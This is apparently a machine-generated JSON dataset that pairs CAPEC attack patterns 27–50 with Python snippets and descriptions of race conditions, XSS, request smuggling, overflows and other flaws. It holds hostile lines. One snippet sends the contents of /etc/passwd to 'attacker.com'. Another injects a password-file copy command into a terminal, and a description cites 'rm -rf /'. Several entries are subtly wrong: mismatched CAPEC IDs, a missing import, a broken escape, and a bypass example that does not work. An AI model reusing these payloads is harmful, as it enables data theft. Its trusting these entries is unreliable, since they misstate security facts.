        "code_snippet": "import os\nimport threading\nimport time\n\n# Shared resource\nfile_path = 'shared_file.txt'\n\n# Function to write to the file\ndef write_to_file():\n    with open(file_path, 'w') as f:\n        f.write('Original content')\n    time.sleep(1)  # Simulate delay\n    with open(file_path, 'w') as f:\n        f.write('Modified content')\n\n# Function to read from the file\ndef read_from_file():\n    time.sleep(0.5)  # Simulate delay\n    with open(file_path, 'r') as f:\n        content = f.read()\n    print(f'Read content: {content}')\n\n# Create threads for writing and reading\nwrite_thread = threading.Thread(target=write_to_file)\nread_thread = threading.Thread(target=read_from_file)\n\n# Start the threads\nwrite_thread.start()\nread_thread.start()\n\n# Wait for threads to complete\nwrite_thread.join()\nread_thread.join()",
        "description": "This Python code snippet demonstrates a race condition vulnerability. The shared resource is a file named 'shared_file.txt'. Two threads are created: one for writing to the file and another for reading from it. The write_to_file function writes 'Original content' to the file, waits for a second, and then writes 'Modified content'. The read_from_file function waits for half a second and then reads the file's content. Due to the timing, the read operation may occur between the two write operations, leading to inconsistent or unexpected results. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs, such as CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-366 (Race Condition within a Thread)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport tempfile\nimport time\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file_name = tmp_file.name\n\n# Simulate a delay to create a race condition\nprint(f\"Temporary file created: {tmp_file_name}\")\ntime.sleep(2)  # Time window for the attacker to create a symlink\n\n# Attacker creates a symlink to a sensitive file\nsensitive_file = '/etc/passwd'\nos.symlink(sensitive_file, tmp_file_name)\n\n# Privileged operation writing to the temporary file\nwith open(tmp_file_name, 'w') as tmp_file:\n    tmp_file.write('malicious content')\n\nprint(f\"Written to: {tmp_file_name}\")",
        "description": "This Python code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The code creates a temporary file and then introduces a delay, simulating a time window during which an attacker can create a symlink pointing to a sensitive file (e.g., '/etc/passwd'). After the delay, the code attempts to write to the temporary file, but due to the symlink, it actually writes to the sensitive file. This embodies the main idea of the CAPEC by showing how an attacker can exploit a time-of-check time-of-use (TOCTOU) race condition to write to unauthorized files using symlinks."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\n\n# Function that simulates processing user input\ndef process_input(user_input):\n    try:\n        # Simulate a command execution with user input\n        command = f\"echo {user_input}\"\n        result = os.popen(command).read()\n        return result\n    except Exception as e:\n        return str(e)\n\n# Fuzzing function to generate random inputs\ndef fuzzing_test():\n    for _ in range(100):  # Simulate 100 fuzzing attempts\n        # Generate random input\n        fuzz_input = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()', k=10))\n        print(f\"Testing with input: {fuzz_input}\")\n        output = process_input(fuzz_input)\n        print(f\"Output: {output}\")\n\nif __name__ == \"__main__\":\n    fuzzing_test()",
        "description": "This Python code snippet demonstrates a basic fuzzing test to identify potential vulnerabilities in a system. The `process_input` function simulates processing user input by constructing and executing a command using the input. The `fuzzing_test` function generates random inputs and tests the `process_input` function with these inputs, printing the results. This approach can help uncover issues related to improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and generation of error messages containing sensitive information (CWE-209). The code embodies the main idea of the CAPEC by treating the system as a black box and using random inputs to identify weaknesses."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport time\nimport threading\n\ndef check_and_use_file(filename):\n    # Time of Check\n    if os.path.exists(filename):\n        print(f\"{filename} exists. Checking permissions...\")\n        # Simulate some delay\n        time.sleep(1)\n        # Time of Use\n        with open(filename, 'r') as file:\n            data = file.read()\n            print(f\"Read data: {data}\")\n\ndef attacker(filename):\n    # Wait for the main thread to check the file\n    time.sleep(0.5)\n    # Replace the file\n    with open(filename, 'w') as file:\n        file.write(\"Malicious content\")\n    print(f\"{filename} has been replaced by the attacker.\")\n\nfilename = \"example.txt\"\n# Create the initial file\nwith open(filename, 'w') as file:\n    file.write(\"Initial content\")\n\n# Start the main thread\nmain_thread = threading.Thread(target=check_and_use_file, args=(filename,))\n# Start the attacker thread\nattacker_thread = threading.Thread(target=attacker, args=(filename,))\n\nmain_thread.start()\nattacker_thread.start()\n\nmain_thread.join()\nattacker_thread.join()",
        "description": "This Python code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The `check_and_use_file` function checks if a file exists and then reads its content after a delay. Meanwhile, an attacker thread replaces the file with malicious content during the delay. This showcases the vulnerability where the state of the file can change between the check and the use, leading to unexpected behavior. The code also highlights related CWEs such as improper synchronization and race conditions within threads."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport time\nimport threading\n\n# Vulnerable function that simulates a privileged thread\ndef privileged_thread():\n    while True:\n        print(\"Privileged thread running...\")\n        time.sleep(1)\n\n# Function to hijack the privileged thread\ndef hijack_thread(thread_id):\n    # Suspend the thread\n    ctypes.windll.kernel32.SuspendThread(thread_id)\n    \n    # Inject malicious code (simulated by changing the thread's context)\n    # This is a simplified example and does not represent actual code injection\n    print(\"Thread hijacked!\")\n    \n    # Resume the thread\n    ctypes.windll.kernel32.ResumeThread(thread_id)\n\n# Create and start the privileged thread\nthread = threading.Thread(target=privileged_thread)\nthread.start()\n\n# Give the thread some time to start\ntime.sleep(2)\n\n# Hijack the thread\nhijack_thread(thread.ident)\n\n# Keep the main thread alive to observe the hijacked thread\nwhile True:\n    time.sleep(1)",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution. The `privileged_thread` function simulates a thread with elevated privileges that runs indefinitely. The `hijack_thread` function suspends this thread, simulates injecting malicious code by printing a message, and then resumes the thread. This example uses the `ctypes` library to interact with low-level thread operations, which is a common technique in real-world attacks. The code embodies the main idea of CAPEC-1000 by showing how an adversary can hijack a privileged thread to execute malicious actions. The related CWEs provide context on potential vulnerabilities, such as improper privilege management (CWE-270), process control issues (CWE-114), and race conditions (CWE-362)."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user authentication\n    if username == 'admin' and password == 'password':\n        # Create a cookie with sensitive information\n        session_id = hashlib.md5(f'{username}{password}'.encode()).hexdigest()\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id == hashlib.md5('adminpassword'.encode()).hexdigest():\n        return 'Welcome to the admin dashboard'\n    return 'Access denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to several issues related to the CAPEC 'Accessing/Intercepting/Modifying HTTP Cookies'. The code simulates a login mechanism where a session ID is generated using a hash of the username and password and stored in a cookie. The dashboard route checks this cookie to grant access. The vulnerabilities include: \n1. CWE-315: Sensitive information (session ID) is stored in cleartext in a cookie.\n2. CWE-565: The application relies on the cookie without validation and integrity checking.\n3. CWE-311: The session ID is not encrypted during transmission.\n4. CWE-539: Use of persistent cookies containing sensitive information.\n5. CWE-384: The session ID is not invalidated upon login, leading to session fixation.\nThis code represents the main idea of the CAPEC by showing how sensitive information in cookies can be accessed, intercepted, or modified to impersonate a user or manipulate the session."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS: directly embedding user input into HTML without proper escaping\n    html_content = f'<h1>Search Results for: {query}</h1>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) through HTTP query strings. The application has a single route '/search' that takes a 'query' parameter from the URL. The value of this parameter is directly embedded into the HTML content without any proper escaping or validation, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'query' parameter, which would then be executed in the victim's browser when they visit the URL. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input can lead to XSS vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import socket\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('localhost', 8080))\n\n# Crafting a malicious HTTP request with smuggling\nmalicious_request = (\n    'POST / HTTP/1.1\\r\\n'\n    'Host: vulnerable-server\\r\\n'\n    'Content-Length: 13\\r\\n'\n    'Transfer-Encoding: chunked\\r\\n\\r\\n'\n    '0\\r\\n\\r\\n'\n    'GET /malicious HTTP/1.1\\r\\n'\n    'Host: vulnerable-server\\r\\n\\r\\n'\n)\n\n# Send the malicious request\ns.sendall(malicious_request.encode('utf-8'))\n\n# Receive the response\nresponse = s.recv(4096)\nprint(response.decode('utf-8'))\n\n# Close the socket\ns.close()",
        "description": "This Python code snippet demonstrates an HTTP Request Smuggling attack. The code creates a socket connection to a local server and sends a crafted HTTP request designed to exploit discrepancies in how different HTTP agents (e.g., proxies, load balancers) interpret HTTP headers. The request uses both 'Content-Length' and 'Transfer-Encoding: chunked' headers to confuse the intermediary agents, leading to the smuggling of a second, malicious HTTP request ('GET /malicious'). This can result in unauthorized actions on the backend server. The code embodies the main idea of CAPEC-33 (HTTP Request Smuggling) and incorporates CWE-444 (Inconsistent Interpretation of HTTP Requests) and CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    user_input = request.args.get('input', '')\n    response = make_response('Hello, ' + user_input)\n    response.headers['Content-Type'] = 'text/html; charset=UTF-8'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to HTTP Response Splitting. The vulnerability arises because the user input is directly included in the HTTP response without proper neutralization of special characters like CR (Carriage Return) and LF (Line Feed). An attacker can exploit this by injecting CRLF sequences into the 'input' parameter, causing the server to split the HTTP response and potentially inject malicious headers or content. This embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\nimport json\n\n# Load configuration from a file\nwith open('config.json', 'r') as file:\n    config = json.load(file)\n\n# Example of improper control of generation of code (CWE-94)\nexec(config['malicious_code'])\n\n# Example of improper neutralization of directives in dynamically evaluated code (CWE-95)\neval(config['malicious_eval'])\n\n# Example of improper link resolution before file access (CWE-59)\nfile_path = config['file_path']\nif os.path.islink(file_path):\n    raise ValueError('Link following detected!')\nwith open(file_path, 'r') as file:\n    data = file.read()\n\n# Example of least privilege violation (CWE-272)\nos.system('sudo ' + config['privileged_command'])",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Leverage Executable Code in Non-Executable Files'. The code loads a configuration from a JSON file, which could be manipulated by an attacker. It then executes code directly from the configuration file (CWE-94), evaluates a potentially malicious string (CWE-95), improperly handles file paths that could be symbolic links (CWE-59), and executes a command with elevated privileges (CWE-272). This snippet highlights how trusting and executing code from non-executable files can lead to severe security issues."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class SensitiveOperations:\n    def __init__(self):\n        self._secret_data = \"Sensitive Information\"\n\n    def _hidden_function(self):\n        return self._secret_data\n\n    def public_function(self):\n        return \"Public Information\"\n\n# Simulating an attacker discovering and invoking the hidden function\nsensitive_ops = SensitiveOperations()\nprint(sensitive_ops._hidden_function())  # Accessing unpublished interface",
        "description": "This Python code snippet demonstrates a class `SensitiveOperations` that contains a hidden method `_hidden_function` which returns sensitive information. The method is intended to be private and not publicly accessible. However, due to the lack of proper access control mechanisms (authentication and authorization), an attacker can easily discover and invoke this hidden method, thereby accessing sensitive data. This example embodies the CAPEC concept of 'Using Unpublished Interfaces or Functionality' and highlights related weaknesses such as 'Missing Authentication for Critical Function' (CWE-306) and 'Missing Authorization' (CWE-862)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\n\n# CWE-312: Cleartext Storage of Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Sensitive data stored in cleartext\nsensitive_data = 'password123'\n\n# Store sensitive data in a file (cleartext storage)\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Store sensitive data in an environment variable (cleartext storage)\nos.environ['SENSITIVE_DATA'] = sensitive_data\n\n# Store sensitive data in a cookie (cleartext storage)\ncookie = f\"Set-Cookie: sensitive_data={sensitive_data}; HttpOnly\"\n\n# Store sensitive data in a registry-like structure (cleartext storage)\registry = {'sensitive_data': sensitive_data}\n\n# Print statements to simulate the use of sensitive data\nprint('Sensitive data stored in file:', open('sensitive_data.txt').read())\nprint('Sensitive data stored in environment variable:', os.environ['SENSITIVE_DATA'])\nprint('Sensitive data stored in cookie:', cookie)\nprint('Sensitive data stored in registry:', registry['sensitive_data'])",
        "description": "This Python code snippet demonstrates the concept of 'Retrieve Embedded Sensitive Data' by storing sensitive information (a password) in various locations without encryption. The code stores the sensitive data in a file, an environment variable, a cookie, and a registry-like structure, all in cleartext. This makes the sensitive data easily retrievable by an attacker who can access these storage locations. The code highlights several related CWEs, including CWE-312 (Cleartext Storage of Sensitive Information), CWE-314 (Cleartext Storage in the Registry), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-318 (Cleartext Storage of Sensitive Information in Executable). The main idea is to show how sensitive data can be improperly stored in cleartext, making it vulnerable to retrieval by attackers."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-99: Improper Control of Resource Identifiers\n\n# Simulate an untrusted search path\nuntrusted_path = '/tmp/malicious'\n\n# Add the untrusted path to the system PATH\nsys.path.insert(0, untrusted_path)\n\n# Simulate loading a configuration file from the untrusted path\nconfig_file = 'config.py'\n\n# CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\n# This is a placeholder for a configuration file that might contain sensitive information\ntry:\n    with open(os.path.join(untrusted_path, config_file), 'r') as file:\n        exec(file.read())\nexcept FileNotFoundError:\n    print('Configuration file not found in the untrusted path.')\n\n# Simulate using a resource from the untrusted path\ntry:\n    import malicious_module\n    malicious_module.execute()\nexcept ImportError:\n    print('Malicious module not found in the untrusted path.')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate the search path to load malicious resources. The code adds an untrusted path ('/tmp/malicious') to the system's PATH and attempts to load a configuration file and a module from this untrusted path. This embodies the CAPEC 'Leveraging/Manipulating Configuration File Search Paths' by showing how an attacker can influence the search path to execute malicious components. The code also touches on related CWEs, such as CWE-426 and CWE-427 (untrusted and uncontrolled search paths), CWE-73 (external control of file name or path), CWE-99 (improper control of resource identifiers), and CWE-555 (plaintext password in configuration file)."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response\nimport base64\n\napp = Flask(__name__)\n\n# Simulated sensitive data stored in a cookie\n@app.route('/set_cookie')\ndef set_cookie():\n    user_data = 'user_id=1234;role=admin'\n    encoded_data = base64.b64encode(user_data.encode()).decode()\n    resp = make_response('Cookie is set')\n    resp.set_cookie('auth_token', encoded_data)\n    return resp\n\n# Endpoint that relies on the cookie without proper validation\n@app.route('/get_data')\ndef get_data():\n    auth_token = request.cookies.get('auth_token')\n    if auth_token:\n        decoded_data = base64.b64decode(auth_token).decode()\n        user_info = dict(item.split('=') for item in decoded_data.split(';'))\n        if user_info.get('role') == 'admin':\n            return 'Sensitive data for admin'\n        else:\n            return 'Sensitive data for user'\n    return 'No auth token provided'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that sets and retrieves a cookie containing sensitive information. The '/set_cookie' endpoint sets a cookie with base64-encoded user data, including a user ID and role. The '/get_data' endpoint retrieves and decodes this cookie to determine the user's role and return sensitive data accordingly. This code embodies the CAPEC concept of 'Manipulating Opaque Client-based Data Tokens' by showing how an attacker could manipulate the 'auth_token' cookie to gain unauthorized access to sensitive data. The code also highlights related CWEs, such as missing integrity checks (CWE-353), improper authorization (CWE-285), and reliance on cookies without validation (CWE-565)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\nimport sys\n\n# Simulate an attacker writing to a terminal device\nattacker_input = \"\\ncat /etc/passwd > /tmp/stolen_passwd\\n\"\n\n# Vulnerable terminal device file (e.g., /dev/pts/1)\nterminal_device = \"/dev/pts/1\"\n\ntry:\n    with open(terminal_device, 'w') as terminal:\n        terminal.write(attacker_input)\nexcept Exception as e:\n    print(f\"Error writing to terminal device: {e}\")\n\n# Simulate the target user hitting enter and executing the command\nos.system('cat /tmp/stolen_passwd')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can write malicious commands to a terminal device that is writable by other users. The attacker writes a command to copy the contents of /etc/passwd to a temporary file. If the target user unknowingly hits enter, the command gets executed with their privileges, leading to a potential security breach. This example embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78), exposure of sensitive information (CWE-214), and process control (CWE-114)."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'attacker@example.com'\n    # Construct email headers with potential meta-characters\n    headers = f\"From: {from_address}\\nTo: {to_address}\\nSubject: {subject}\\n\"\n    # Improper neutralization of meta-characters in headers\n    msg = MIMEText(body)\n    msg.set_payload(headers + body)\n\n    # Send the email\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, to_address, msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'Hello', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email-sending function that improperly handles meta-characters in email headers. The function `send_email` constructs email headers using string interpolation, which can be exploited by an attacker to inject malicious payloads. The headers are concatenated with the email body without proper neutralization or escaping of special characters, making it susceptible to injection attacks. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads, and it highlights related CWEs such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\nfrom email import policy\nfrom email.parser import BytesParser\n\n# Simulate receiving an email with MIME content\nraw_email = b\"\"\"MIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\nHello, this is a test email with MIME content.\n\"\"\"\n\n# Parse the email\nmsg = BytesParser(policy=policy.default).parsebytes(raw_email)\n\n# Vulnerable function to convert MIME content to plain text\n# This function does not check the size of the input buffer\n# leading to a potential buffer overflow\n\ndef vulnerable_mime_conversion(mime_content):\n    buffer = bytearray(256)  # Fixed size buffer\n    for i in range(len(mime_content)):\n        buffer[i] = mime_content[i]  # No bounds checking\n    return buffer.decode('utf-8')\n\n# Extract MIME content and convert it\nmime_content = msg.get_payload(decode=True)\nplain_text = vulnerable_mime_conversion(mime_content)\nprint(plain_text)",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow, as described in the CAPEC. The code simulates receiving an email with MIME content and then parses it. The `vulnerable_mime_conversion` function attempts to convert the MIME content to plain text but does not check the size of the input buffer, leading to a potential buffer overflow. This embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code highlights the risk of not validating input sizes during MIME conversion, which can be exploited by attackers to gain control over the system."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import os\n\n# First parser layer\nuser_input = input(\"Enter your command: \")\nparsed_input = user_input.replace(\"\\\\\", \"\")  # Remove escape characters\n\n# Input validation layer\nif any(char in parsed_input for char in [';', '&', '|']):\n    raise ValueError(\"Invalid characters in input!\")\n\n# Second parser layer\nfinal_command = parsed_input.replace(\"\\n\", \"\")  # Remove newlines\n\n# Execution layer\nos.system(final_command)",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before all parsing layers have been applied, allowing an attacker to bypass the validation. The user input is first processed by removing escape characters (first parser layer). Then, it is validated to check for dangerous characters like ';', '&', and '|'. However, after validation, the input undergoes another parsing step where newlines are removed (second parser layer). This sequence can allow an attacker to craft input that passes validation but becomes dangerous after the second parsing step. For example, an input like 'echo hello\\n; rm -rf /' would pass validation but result in a dangerous command after the newline is removed. This code embodies the main idea of CAPEC-173 by showing how multiple input interpretation layers can be exploited to bypass input validation."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import struct\n\ndef process_binary_file(file_path):\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            # Assume the first 4 bytes represent the size of the payload\n            payload_size = struct.unpack('<I', data[:4])[0]\n            # Vulnerable buffer allocation without size check\n            buffer = bytearray(256)\n            for i in range(payload_size):\n                buffer[i] = data[4 + i]\n            print('File processed successfully')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n\n# Example usage\nprocess_binary_file('example.mp3')",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a binary file, such as an MP3. The function reads the file and interprets the first 4 bytes as the size of the payload. It then attempts to copy the payload into a fixed-size buffer without checking if the payload size exceeds the buffer size, leading to a potential buffer overflow (CWE-120, CWE-119). This vulnerability can be exploited by an attacker to execute arbitrary code. The code embodies the main idea of the CAPEC by showing how a binary resource file can be used to exploit a buffer overflow vulnerability."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\nimport sys\n\n# Function to read the content of a symbolic link\n# and copy it to a buffer without proper size checks\ndef read_symlink_and_copy(link_path):\n    try:\n        # Read the symbolic link\n        symlink_content = os.readlink(link_path)\n        \n        # Buffer to copy the content\n        buffer = bytearray(256)\n        \n        # Copy content to buffer without checking size\n        for i in range(len(symlink_content)):\n            buffer[i] = ord(symlink_content[i])\n        \n        print(\"Buffer content copied successfully.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <symlink_path>\")\n        sys.exit(1)\n    \n    symlink_path = sys.argv[1]\n    read_symlink_and_copy(symlink_path)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via symbolic links. The function `read_symlink_and_copy` reads the content of a symbolic link and copies it to a fixed-size buffer without checking if the content fits within the buffer's bounds. This can lead to a buffer overflow if the symbolic link's content exceeds the buffer size. The code embodies CWE-120 (Classic Buffer Overflow) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) by not validating the size of the input before copying it to the buffer. Additionally, it touches on CWE-20 (Improper Input Validation) by not validating the symbolic link's content."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import cgi\n\n# Simulate a configuration file with oversized strings\nconfig_data = '<config><tag>' + 'A' * 1000 + '</tag></config>'\n\n# Vulnerable function to parse the configuration data\ndef parse_config(data):\n    buffer = [''] * 256  # Fixed-size buffer\n    tag_start = data.find('<tag>') + len('<tag>')\n    tag_end = data.find('</tag>')\n    if tag_start == -1 or tag_end == -1:\n        return 'Invalid config'\n    tag_content = data[tag_start:tag_end]\n    for i in range(len(tag_content)):\n        buffer[i] = tag_content[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Simulate receiving and parsing the configuration data\nparsed_data = parse_config(config_data)\nprint(parsed_data)",
        "description": "This Python code snippet demonstrates a vulnerable function that parses a configuration file containing oversized strings, leading to a buffer overflow. The `config_data` variable simulates a configuration file with a tag containing a string of 1000 'A' characters. The `parse_config` function attempts to parse the tag content and copy it into a fixed-size buffer of 256 elements without checking the bounds. This can cause a buffer overflow, as the tag content exceeds the buffer size. This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n\n    # CWE-131: Incorrect Calculation of Buffer Size\n    buffer_size = len(user_input) * 2\n    buffer = [''] * buffer_size\n\n    # CWE-120: Classic Buffer Overflow\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n\n    # Simulate parameter expansion\n    expanded_input = os.path.expandvars(''.join(buffer))\n\n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    for i in range(len(expanded_input)):\n        buffer[i] = expanded_input[i]  # Potential buffer overflow\n\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 50  # This input will be expanded and cause a buffer overflow\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerable_function` takes user input and performs several operations that lead to a buffer overflow. Initially, it checks if the input is a string (CWE-20: Improper Input Validation). It then incorrectly calculates the buffer size (CWE-131: Incorrect Calculation of Buffer Size) by doubling the length of the input. The input is copied into the buffer without checking the size (CWE-120: Classic Buffer Overflow). The input is then expanded using `os.path.expandvars`, which can increase its size. Finally, the expanded input is copied back into the buffer without proper bounds checking (CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer), leading to a potential buffer overflow."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import requests\n\n# Function that expects a URL but can be tricked into accepting a local file path\ndef fetch_data(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return response.text\n        else:\n            return 'Error fetching data'\n    except Exception as e:\n        return str(e)\n\n# Example usage\n# An attacker could pass a local file path instead of a URL\nmalicious_input = 'file:///etc/passwd'\nresult = fetch_data(malicious_input)\n\n# Send the fetched data to an attacker's server\nattacker_server = 'http://attacker.com/collect'\nrequests.get(f'{attacker_server}?data={result}')",
        "description": "This Python code snippet demonstrates a vulnerability where a function `fetch_data` expects a URL but can be tricked into accepting a local file path. The function uses the `requests.get` method to fetch data from the provided URL. An attacker can exploit this by passing a local file path (e.g., 'file:///etc/passwd') instead of a URL. The fetched data, which could contain sensitive information, is then sent to an attacker's server. This embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and incorporates related CWEs such as improper handling of unexpected data types (CWE-241) and use of GET request method with sensitive query strings (CWE-598)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\n\n# Weak password requirements (CWE-521)\npassword_length = 4\nalphabet = string.ascii_lowercase  # Only lower case letters\n\n# Simulated user password\nuser_password = 'pass'\n\n# Brute force attack\nfor attempt in itertools.product(alphabet, repeat=password_length):\n    attempt = ''.join(attempt)\n    if attempt == user_password:\n        print(f'Password found: {attempt}')\n        break\n",
        "description": "This Python code snippet demonstrates a brute force attack on a weak password system. The code uses itertools.product to generate all possible combinations of a 4-character password using only lowercase letters (CWE-521: Weak Password Requirements). The simulated user password is 'pass'. The code iterates through each possible password combination and checks if it matches the user password. If a match is found, it prints the password and breaks the loop. This snippet highlights the vulnerability of systems with weak password requirements and the feasibility of brute force attacks when passwords are short and use a limited character set."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\n# Weak password recovery mechanism\nusers = {\n    'user1': {'password': '5f4dcc3b5aa765d61d8327deb882cf99', 'security_answer': 'petname'},  # 'password' hashed with MD5\n}\n\n# Function to recover password\ndef recover_password(username, security_answer):\n    if username in users and users[username]['security_answer'] == security_answer:\n        return users[username]['password']  # Returning hashed password directly\n    return 'Invalid username or security answer'\n\n# Example usage\nusername = 'user1'\nsecurity_answer = 'petname'\nrecovered_password = recover_password(username, security_answer)\nprint(f'Recovered password hash for {username}: {recovered_password}')\n",
        "description": "This Python code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code stores user passwords in a recoverable format (MD5 hash) and uses a simple security question for password recovery. If an attacker knows or guesses the security answer, they can retrieve the hashed password, which can be used in further attacks. This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials). The code is intentionally insecure to illustrate the vulnerabilities associated with weak password recovery mechanisms."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
